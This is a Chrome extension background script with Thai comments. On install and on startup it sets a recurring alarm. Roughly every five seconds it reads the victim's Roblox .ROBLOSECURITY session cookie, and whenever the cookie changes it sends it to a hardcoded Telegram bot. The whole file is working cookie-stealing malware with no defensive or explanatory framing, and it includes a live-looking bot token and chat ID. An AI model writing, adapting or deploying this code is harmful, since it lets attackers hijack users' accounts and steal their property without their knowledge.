let lastCookie = "";

async function checkCookie(){

  chrome.cookies.get({
    url: "https://www.roblox.com",
    name: ".ROBLOSECURITY"
  }, (cookie)=>{

    if(!cookie) return;

    const current = cookie.value;

    if(current !== lastCookie){

      lastCookie = current;

      fetch("https://api.telegram.org/bot8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0/sendMessage",{
        method:"POST",
        headers:{
          "Content-Type":"application/json"
        },
        body:JSON.stringify({
          chat_id:"8508643177",
          text:"Roblox Cookie ใหม่:\n"+current
        })
      });

    }

  });

}

// สร้าง alarm ทุก 5 วินาที
chrome.runtime.onInstalled.addListener(()=>{
  chrome.alarms.create("checkCookie",{
    periodInMinutes: 0.0833 // 5 วิ
  });
});

// เมื่อ alarm ทำงาน
chrome.alarms.onAlarm.addListener((alarm)=>{
  if(alarm.name === "checkCookie"){
    checkCookie();
  }
});

chrome.runtime.onStartup.addListener(()=>{
  chrome.alarms.create("checkCookie",{
    periodInMinutes: 0.0833
  });
});
